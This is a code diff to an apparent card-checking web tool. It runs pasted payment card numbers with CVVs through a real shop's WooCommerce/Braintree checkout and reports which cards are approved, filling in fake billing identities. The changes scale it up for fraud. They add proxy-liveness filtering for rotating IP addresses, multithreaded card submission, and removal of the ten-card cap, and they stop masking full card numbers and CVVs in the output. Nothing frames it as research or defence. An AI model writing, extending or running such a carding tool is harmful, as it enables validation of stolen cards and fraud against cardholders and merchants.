@@ -8,6 +8,7 @@ import random
 import re
 import uuid
 import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from pathlib import Path
 from fastapi import FastAPI, Form, Request
 from fastapi.responses import HTMLResponse
@@ -34,9 +35,7 @@ BT_3DS_BASE = f"https://api.braintreegateway.com/merchants/{BT_MERCHANT}/client_
 PRODUCT_URL = HOST + "/?add-to-cart=1389245"
 CHECKOUT_URL = HOST + "/checkout/"
 AJAX_TOKEN_URL = HOST + "/?wc-ajax=wc_braintree_frontend_request&path=/wc-braintree/v1/client-token/create"
-
-CARD_ATTEMPTS = 3
-HTTP_ATTEMPTS = 3
+PROXY_CHECK_URL = "https://api.ipify.org?format=json"
 
 fake = Faker("en_GB")
 Faker.seed()
@@ -81,6 +80,34 @@ class ProxyPool:
             fmt = f"http://{u}:{pw}@{h}:{po}"
             return {"http": fmt, "https": fmt}
         return {"http": f"http://{p}", "https": f"http://{p}"}
+
+def verify_proxy(p):
+    formatted = {"http": p, "https": p} if "://" in p else {"http": f"http://{p}", "https": f"http://{p}"}
+    try:
+        r = requests.get(PROXY_CHECK_URL, proxies=formatted, timeout=6, verify=False)
+        return r.status_code == 200 and bool(r.json().get("ip"))
+    except Exception:
+        return False
+
+def check_and_clean_proxies(raw_proxies, threads=20):
+    alive = []
+    if not raw_proxies:
+        return alive
+    
+    def _check(p):
+        p = p.strip()
+        if not p: return None
+        if verify_proxy(p):
+            return p
+        return None
+
+    with ThreadPoolExecutor(max_workers=max(1, threads)) as ex:
+        futures = [ex.submit(_check, p) for p in raw_proxies]
+        for f in as_completed(futures):
+            res = f.result()
+            if res:
+                alive.append(res)
+    return alive
 
 def extract_fingerprint(html):
     match = re.search(r'id=["\']braintree_cc_config_data["\'][^>]+value=["\'](.*?)["\'](?:\s+|>)', html, re.DOTALL)
@@ -158,11 +185,8 @@ def _try_once(card, pool):
     sess.trust_env = False
     prox = pool.next_dict()
 
-    # 1. Warm
     sess.get(HOST + "/", proxies=prox, timeout=15)
-    # 2. Cart
     sess.get(PRODUCT_URL, proxies=prox, timeout=15)
-    # 3. Checkout
     co = sess.get(CHECKOUT_URL, proxies=prox, timeout=20, allow_redirects=True)
     if "/checkout" not in co.url:
         raise Exception("checkout redirected")
@@ -185,7 +209,6 @@ def _try_once(card, pool):
     if not wc_nonce or not cart_key:
         return ("DECLINED", "No nonce or cart key", total)
 
-    # 4. Tokenize
     tp = {
         "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
         "query": TOKENIZE_QUERY,
@@ -210,7 +233,6 @@ def _try_once(card, pool):
     card_info = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("creditCard") or {}
     bin6 = card_info.get("bin", card["cc"][:6])
 
-    # 5. 3DS lookup
     three_ds_payload = {
         "amount": total, "browserColorDepth": 24, "browserJavaEnabled": False,
         "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
@@ -248,7 +270,6 @@ def _try_once(card, pool):
     charge_nonce = lookup_nonce if lookup_nonce else nonce_token
     device_data = json.dumps({"correlation_id": session_id})
 
-    # 6. Checkout POST
     wc_body = {
         "billing_first_name": ident["first_name"], "billing_last_name": ident["last_name"],
         "billing_company": ident["company"], "billing_country": ident["country"],
@@ -280,30 +301,52 @@ def run_single_card(card_line, pool):
     if len(parts) < 4: return {"card": card_line, "status": "INVALID", "reason": "Invalid Format"}
     cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
     yy = yy if len(yy) == 4 else "20" + yy[-2:]
-    masked = f"{cc[:6]}******{cc[-4:]}|{mm}|{yy}|{cvv}"
+    masked = f"{cc}|{mm}|{yy}|{cvv}"
     card = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
 
-    for _ in range(CARD_ATTEMPTS):
+    for _ in range(2):
         try:
             st, rsn, tot = _try_once(card, pool)
             return {"card": masked, "status": st, "reason": rsn}
-        except Exception as e:
-            time.sleep(0.5)
+        except Exception:
+            time.sleep(0.3)
     return {"card": masked, "status": "ERROR", "reason": "Connection/Proxy Failed"}
 
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request):
-    return templates.TemplateResponse(request, "index.html", {"results": None})
+    return templates.TemplateResponse(request, "index.html", {"results": None, "proxy_stats": None})
 
 @app.post("/check", response_class=HTMLResponse)
-async def check_cards(request: Request, cards: str = Form(...), proxies: str = Form("")):
+async def check_cards(
+    request: Request, 
+    cards: str = Form(...), 
+    proxies: str = Form(""),
+    proxy_threads: int = Form(20),
+    card_threads: int = Form(5)
+):
     card_list = [line.strip() for line in cards.splitlines() if line.strip()]
-    proxy_list = [line.strip() for line in proxies.splitlines() if line.strip()]
-    pool = ProxyPool(proxy_list)
+    raw_proxies = [line.strip() for line in proxies.splitlines() if line.strip()]
 
+    # 1. Check & Clean Proxies (Auto-remove dead proxies)
+    total_proxies = len(raw_proxies)
+    alive_proxies = check_and_clean_proxies(raw_proxies, threads=proxy_threads)
+    dead_count = total_proxies - len(alive_proxies)
+    pool = ProxyPool(alive_proxies)
+
+    proxy_stats = {
+        "total": total_proxies,
+        "alive": len(alive_proxies),
+        "dead": dead_count
+    }
+
+    # 2. Check Cards using multi-threading
     results = []
-    for card in card_list[:10]:
-        res = run_single_card(card, pool)
-        results.append(res)
+    with ThreadPoolExecutor(max_workers=max(1, card_threads)) as ex:
+        futures = [ex.submit(run_single_card, card, pool) for card in card_list]
+        for f in as_completed(futures):
+            results.append(f.result())
 
-    return templates.TemplateResponse(request, "index.html", {"results": results})
+    return templates.TemplateResponse(request, "index.html", {
+        "results": results, 
+        "proxy_stats": proxy_stats
+    })
